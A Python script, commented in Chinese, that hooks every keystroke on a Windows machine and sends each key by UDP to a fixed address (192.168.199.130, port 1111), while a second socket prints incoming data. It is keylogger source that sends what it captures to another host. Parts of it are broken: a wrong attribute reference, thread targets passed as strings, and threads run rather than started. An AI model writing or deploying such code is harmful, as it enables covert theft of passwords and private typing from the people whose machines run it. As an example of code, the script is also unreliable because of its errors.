import socket
import win32api
import pythoncom
import pyHook
import threading		#多线程

global temp

clientname = '192.168.199.130'
clientport = 1111
serverport = 8080
buffsize = 1

clientSocket =socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

serverSocket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)		#SOCK_DGRAM表示基数据报格式即UDP连接

serverSocket.bind(('',serverport))		#（host,port）的形式表示地址、引号表示可以接受任何地址来的数据报

def onKeyboardEvent(event):	# 监听键盘事件
	if (event.Key=='Lshift') or (event.Key=='Rshift'):
		temp = '@'
	elif onKeyboardEvent.Key=='Escape':	#遇到Esc键退出
		win32api.PostQuitMessage()
	else:
		temp = (event.Key).lower()	#将输入的键盘值之间缓冲到temp
	clientSocket.sendto(temp.encode(),(clientname,clientport))

	return True

#def Listenkeyboard():
#	pythoncom.PumpMessages(800)		# 进入循环，如不手动关闭，程序将一直处于监听状态

def Receive():
	print ('Ready to receive message')
	while(1):
		message,ServerAddress = serverSocket.recvfrom(1024)
		print (message.hex())


if __name__ == "__main__":
	hm = pyHook.HookManager()	# 创建一个“钩子”管理对象
	hm.KeyDown = onKeyboardEvent		# 监听所有键盘事件
	hm.HookKeyboard()		# 设置键盘“钩子”
	#processes = ['onKeyboardEvent','Receive']
	threads = []
	th1 = threading.Thread(target='onKeyboardEvent',args=())
	th1.run()
	threads.append(th1)
	th2 = threading.Thread(target='Receive',args=())
	th2.run()
	threads.append(th2)